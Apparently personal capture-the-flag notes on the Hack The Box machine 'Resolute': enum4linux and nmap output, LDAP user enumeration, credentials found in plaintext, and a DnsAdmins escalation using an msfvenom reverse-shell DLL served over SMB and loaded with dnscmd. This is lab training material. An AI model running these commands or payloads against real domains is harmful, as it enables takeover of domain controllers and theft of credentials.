$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.<br /><br /><br />[+] Attaching to 10.10.10.169 using a NULL share<br /><br />[+] Trying protocol 445/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] MEGABANK<br />	[+] Builtin<br /><br />[+] Password Info for Domain: MEGABANK<br /><br />	[+] Minimum password length: 7<br />	[+] Password history length: 24<br />	[+] Maximum password age: Not Set<br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: 1 day 4 minutes <br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: Not Set<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 7<br /><br /><br /> ============================== <br />|    Groups on 10.10.10.169    |<br /> ============================== <br /><br />[+] Getting builtin groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />group:[Account Operators] rid:[0x224]<br />group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]<br />group:[Incoming Forest Trust Builders] rid:[0x22d]<br />group:[Windows Authorization Access Group] rid:[0x230]<br />group:[Terminal Server License Servers] rid:[0x231]<br />group:[Administrators] rid:[0x220]<br />group:[Users] rid:[0x221]<br />group:[Guests] rid:[0x222]<br />group:[Print Operators] rid:[0x226]<br />group:[Backup Operators] rid:[0x227]<br />group:[Replicator] rid:[0x228]<br />group:[Remote Desktop Users] rid:[0x22b]<br />group:[Network Configuration Operators] rid:[0x22c]<br />group:[Performance Monitor Users] rid:[0x22e]<br />group:[Performance Log Users] rid:[0x22f]<br />group:[Distributed COM Users] rid:[0x232]<br />group:[IIS_IUSRS] rid:[0x238]<br />group:[Cryptographic Operators] rid:[0x239]<br />group:[Event Log Readers] rid:[0x23d]<br />group:[Certificate Service DCOM Access] rid:[0x23e]<br />group:[RDS Remote Access Servers] rid:[0x23f]<br />group:[RDS Endpoint Servers] rid:[0x240]<br />group:[RDS Management Servers] rid:[0x241]<br />group:[Hyper-V Administrators] rid:[0x242]<br />group:[Access Control Assistance Operators] rid:[0x243]<br />group:[Remote Management Users] rid:[0x244]<br />group:[System Managed Accounts Group] rid:[0x245]<br />group:[Storage Replica Administrators] rid:[0x246]<br />group:[Server Operators] rid:[0x225]<br /><br />[+] Getting builtin group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;IIS_IUSRS&#39; (RID: 568) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Users&#39; (RID: 545) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Remote Management Users&#39; (RID: 580) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Pre-Windows 2000 Compatible Access&#39; (RID: 554) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Administrators&#39; (RID: 544) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Guests&#39; (RID: 546) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;System Managed Accounts Group&#39; (RID: 581) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Windows Authorization Access Group&#39; (RID: 560) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting local groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />group:[Cert Publishers] rid:[0x205]<br />group:[RAS and IAS Servers] rid:[0x229]<br />group:[Allowed RODC Password Replication Group] rid:[0x23b]<br />group:[Denied RODC Password Replication Group] rid:[0x23c]<br />group:[DnsAdmins] rid:[0x44d]<br /><br />[+] Getting local group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;DnsAdmins&#39; (RID: 1101) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.<br />Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: Couldn&#39;t lookup SIDs<br /><br />[+] Getting domain groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]<br />group:[Domain Admins] rid:[0x200]<br />group:[Domain Users] rid:[0x201]<br />group:[Domain Guests] rid:[0x202]<br />group:[Domain Computers] rid:[0x203]<br />group:[Domain Controllers] rid:[0x204]<br />group:[Schema Admins] rid:[0x206]<br />group:[Enterprise Admins] rid:[0x207]<br />group:[Group Policy Creator Owners] rid:[0x208]<br />group:[Read-only Domain Controllers] rid:[0x209]<br />group:[Cloneable Domain Controllers] rid:[0x20a]<br />group:[Protected Users] rid:[0x20d]<br />group:[Key Admins] rid:[0x20e]<br />group:[Enterprise Key Admins] rid:[0x20f]<br />group:[DnsUpdateProxy] rid:[0x44e]<br />group:[Contractors] rid:[0x44f]<br /><br />[+] Getting domain group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Admins&#39; (RID: 512) has member: MEGABANK\Administrator<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Schema Admins&#39; (RID: 518) has member: MEGABANK\Administrator<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Controllers&#39; (RID: 516) has member: MEGABANK\RESOLUTE$<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\Administrator<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\DefaultAccount<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\krbtgt<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\ryan<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\marko<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\sunita<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\abigail<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\marcus<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\sally<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\fred<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\angela<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\felicia<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\gustavo<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\ulf<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\stevie<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\claire<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\paulo<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\steve<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\annette<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\annika<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\per<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\claude<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\melanie<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\zach<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\simon<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\naoki<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Computers&#39; (RID: 515) has member: MEGABANK\MS02$<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Enterprise Admins&#39; (RID: 519) has member: MEGABANK\Administrator<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Contractors&#39; (RID: 1103) has member: MEGABANK\ryan<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Guests&#39; (RID: 514) has member: MEGABANK\Guest<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br /><br /> ======================================================================= <br />|    Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.<br />[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.<br /><br /> ============================================= <br />|    Getting printer info for 10.10.10.169    |<br /> ============================================= <br />Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br /><br /><br />enum4linux complete on Tue Dec 17 11:34:30 2019<br /><br /></div><div class='page'><h1 class='title level-5'>proof</h1><br/>user<br />0c3be45fcfe249796ccbee8d3a978540<br />root</div><div class='page'><h1 class='title level-4'>10.10.10.169 Resolute2</h1><br/>nmap showed an assload of ports open.<br />dns showed megabank.local and ldap showed resolute.megabank.local. Both were added to /etc/hosts<br /><br />ldapsearch dumped me a great userlist<br />ldapsearch -h 10.10.10.169 -x -b &quot;DC=megabank,DC=local&quot; | grep -i sam | grep -v 8 | awk &#39;{print $2}&#39; &gt; users.txt<br /><br />enum4linux got me a password for mark novak<br />novak:Welcome123!<br /><br />nothing with novak would let me login<br /><br />I used the smbloop to see if the password worked for another user...<br />Score!<br />melanie:Welcome123!<br />evil-winrm in... user!<br /><br />after cheating...<br />dir -force on C:\ shows you a wierd dir. Follow it and you get creds for the other user ryan.<br />C:\pstranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt<br />ryan<br />Serv3r4Admin4cc123!<br />evil-winrm in as ryan<br /><br />whoami /groups showed me that I was part of dnsadmins (Prepare to be rooted!)<br />msfvenom to make a malicious .dll<br />msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f dll &gt; yee.dll<br />smbserver.py yeet `pwd`<br />nc -nlvp 3232<br /><br />net view \\10.10.14.60<br />dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.60\yeet\yee.dll<br />sc.exe stop dns<br />sc.exe start dns<br />rooted!<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>dns showed megabank.local, added to /etc/hosts<br /><br />ldapsearch -h 10.10.10.169 -x -b &quot;DC=megabank,DC=local&quot; | grep -i sam | grep -v 8 | awk &#39;{print $2}&#39; &gt; users.txt<br /><br />x64<br /><br />marko novak <br />Welcome123!<br /><br />smbloop<br /><br />ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p &#39;Welcome123!&#39;<br /><br />cd C:\<br />dir -force <br />C:\pstranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt<br />ryan<br />Serv3r4Admin4cc123!<br /><br />ruby evil-winrm.rb -i 10.10.10.169 -u ryan -p &#39;Serv3r4Admin4cc123!&#39;</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap 10.10.10.169 &amp;&amp; nmap -sC -sV 10.10.10.169 &amp;&amp; nmap -p- 10.10.10.169<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-14 13:17 EDT<br />Nmap scan report for 10.10.10.169<br />Host is up (0.55s latency).<br />Not shown: 988 closed ports<br />PORT      STATE SERVICE<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />50636/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 51.47 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-14 13:18 EDT<br />Nmap scan report for 10.10.10.169<br />Host is up (0.28s latency).<br />Not shown: 989 closed ports<br />PORT     STATE SERVICE      VERSION<br />53/tcp   open  domain?<br />| fingerprint-strings: <br />|   DNSVersionBindReqTCP: <br />|     version<br />|_    bind<br />88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-14 17:26:17Z)<br />135/tcp  open  msrpc        Microsoft Windows RPC<br />139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br />389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)<br />445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)<br />464/tcp  open  kpasswd5?<br />593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br />636/tcp  open  tcpwrapped<br />3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)<br />3269/tcp open  tcpwrapped<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port53-TCP:V=7.80%I=7%D=4/14%Time=5E95F0A8%P=x86_64-pc-linux-gnu%r(DNSV<br />SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\<br />SF:x04bind\0\0\x10\0\x03&quot;);<br />Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 2h26m45s, deviation: 4h02m31s, median: 6m44s<br />| smb-os-discovery: <br />|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br />|   Computer name: Resolute<br />|   NetBIOS computer name: RESOLUTE\x00<br />|   Domain name: megabank.local<br />|   Forest name: megabank.local<br />|   FQDN: Resolute.megabank.local<br />|_  System time: 2020-04-14T10:27:05-07:00<br />| smb-security-mode: <br />|   account_used: &lt;blank&gt;<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: required<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2020-04-14T17:27:07<br />|_  start_date: 2020-04-14T17:02:26<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 244.63 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-14 13:22 EDT<br />Stats: 0:34:46 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan<br />Connect Scan Timing: About 28.04% done; ETC: 15:26 (1:29:14 remaining)<br /></div><div class='page'><h1 class='title level-6'>ldap</h1><br/></div><div class='page'><h1 class='title level-7'>nmap ldap</h1><br/>nmap -p 389 --script ldap-search -Pn 10.10.10.169<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-14 13:30 EDT<br />Nmap scan report for megabank.local (10.10.10.169)<br />Host is up (0.20s latency).<br /><br />PORT    STATE SERVICE<br />389/tcp open  ldap<br />| ldap-search: <br />|   Context: DC=megabank,DC=local<br />|     dn: DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: domain<br />|         objectClass: domainDNS<br />|         distinguishedName: DC=megabank,DC=local<br />|         instanceType: 5<br />|         whenCreated: 2019/09/25 13:28:22 UTC<br />|         whenChanged: 2020/04/14 17:02:16 UTC<br />|         subRefs: DC=ForestDnsZones,DC=megabank,DC=local<br />|         subRefs: DC=DomainDnsZones,DC=megabank,DC=local<br />|         subRefs: CN=Configuration,DC=megabank,DC=local<br />|         uSNCreated: 4099<br />|         \x19\x9A\xF2\xBC<br />|         uSNChanged: 147500<br />|         name: megabank<br />|         objectGUID: b4e0e946-e7cb-b742-8fa0-5c4cec2fe5aa<br />|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00;\xFE\xC7\x0EMO\x9F@\x81\xB6~\xC4\x91\xD3R\x8C\x1A\xC0\x01\x00\x00\x00\x00\x00\x0Cs\xF7\x13\x03\x00\x00\x00\xC2\x1D)\x1D\xC8\x1B\xD9G\xA2\xBCRK\xE1\x0F\x10d\x08\xA0\x00\x00\x00\x00\x00\x00\x115\x9F\x13\x03\x00\x00\x00p\x11cD\x9C\x9F\xC9N\xA6k\&lt;\xDE\xBB\xAB|\x1C\xE0\x01\x00\x00\x00\x00\x00F{\xF7\x13\x03\x00\x00\x00\xAA8\x88adCkM\xB6\xD63\x9EGMk\xC8\x07\x90\x00\x00\x00\x00\x00\x00Z0\x9F\x13\x03\x00\x00\x00\x05\xA2\xB2b\xFB)\x86A\xB05\xFD\xBE\x97\xF4\xCEq	\xB0\x00\x00\x00\x00\x00\x00\xD07\x9F\x13\x03\x00\x00\x00`\x9D\x0Ee\xB3T\xBDE\xB4g\x88\x07\x05\xFCI\xE1\x05p\x00\x00\x00\x00\x00\x00&lt; \x9F\x13\x03\x00\x00\x00\xD9<br />|         cjy\xA3\xC2I\x89d\xE1om\x86\xB0Y\x1F\x10\x02\x00\x00\x00\x00\x00\xF1.\xF8\x13\x03\x00\x00\x0068\xC9\x82\x1E\xBD\xD2N\x92\x1CL\xAF\xF2=\xC6o\x0C\xE0\x00\x00\x00\x00\x00\x00@\x1F\xE6\x13\x03\x00\x00\x00\x11:\x85\x83#\x98\xDAJ\xAA\x83\xE6\xF7%{w\xC1\x18\xA0\x01\x00\x00\x00\x00\x00<br />|         i\xF7\x13\x03\x00\x00\x00\xD0\xBBK\x8B\xF5\xB5\xD5D\xBE\xF9\xD7\x92\xCEz?;\x1B\xD0\x01\x00\x00\x00\x00\x00vw\xF7\x13\x03\x00\x00\x00<br />|         n\xF7\x13\x03\x00\x00\x00%}:\xF7\xE0\xF6\xEFM\xB2\xE2\xDD\x80.\xF0*\xB3\x17\x90\x01\x00\x00\x00\x00\x00\xBB`\xF7\x13\x03\x00\x00\x00\xF90\xC0\xFF\x9Df\xB6K\x939WR\x81\xC5P\xA6\x1E\x00\x02\x00\x00\x00\x00\x00\x07\x1D\xF8\x13\x03\x00\x00\x00<br />|         creationTime: 132313573363465705<br />|         forceLogoff: -9223372036854775808<br />|         lockoutDuration: -18000000000<br />|         lockOutObservationWindow: -18000000000<br />|         lockoutThreshold: 0<br />|         maxPwdAge: -9223372036854775808<br />|         minPwdAge: -864000000000<br />|         minPwdLength: 7<br />|         modifiedCountAtLastProm: 0<br />|         nextRid: 1000<br />|         pwdProperties: 0<br />|         pwdHistoryLength: 24<br />|         objectSid: 1-5-21-1392959593-3013219662-3596683436<br />|         serverState: 1<br />|         uASCompat: 1<br />|         modifiedCount: 1<br />|         auditingPolicy: \x00\x01<br />|         nTMixedDomain: 0<br />|         rIDManagerReference: CN=RID Manager$,CN=System,DC=megabank,DC=local<br />|         fSMORoleOwner: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local<br />|         systemFlags: -1946157056<br />|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=megabank,DC=local<br />|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=megabank,DC=local<br />|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=megabank,DC=local;0]<br />|         dSCorePropagationData: 1601/01/01 00:00:00 UTC<br />|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=megabank,DC=local<br />|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=megabank,DC=local<br />|         masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local<br />|         ms-DS-MachineAccountQuota: 10<br />|         msDS-Behavior-Version: 7<br />|         msDS-PerUserTrustQuota: 1<br />|         msDS-AllUsersTrustQuota: 1000<br />|         msDS-PerUserTrustTombstonesQuota: 10<br />|         msDs-masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local<br />|         msDS-IsDomainFor: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local<br />|         msDS-NcType: 0<br />|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE<br />|         dc: megabank<br />|     dn: CN=Users,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         cn: Users<br />|         description: Default container for upgraded user accounts<br />|         distinguishedName: CN=Users,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5888<br />|         uSNChanged: 5888<br />|         showInAdvancedViewOnly: FALSE<br />|         name: Users<br />|         objectGUID: d0ed52a-e080-9841-81d6-302cdfab7cf<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:19 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: CN=Computers,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         cn: Computers<br />|         description: Default container for upgraded computer accounts<br />|         distinguishedName: CN=Computers,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5889<br />|         uSNChanged: 5889<br />|         showInAdvancedViewOnly: FALSE<br />|         name: Computers<br />|         objectGUID: 41e2c5ff-1512-be45-9ca1-488358ad588<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: OU=Domain Controllers,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: organizationalUnit<br />|         ou: Domain Controllers<br />|         description: Default container for domain controllers<br />|         distinguishedName: OU=Domain Controllers,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 6031<br />|         uSNChanged: 6031<br />|         showInAdvancedViewOnly: FALSE<br />|         name: Domain Controllers<br />|         objectGUID: 12316bd2-27fe-3a41-90d0-471b6f5e7497<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         gPLink: [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=megabank,DC=local;0]<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: CN=System,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         cn: System<br />|         description: Builtin system settings<br />|         distinguishedName: CN=System,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5890<br />|      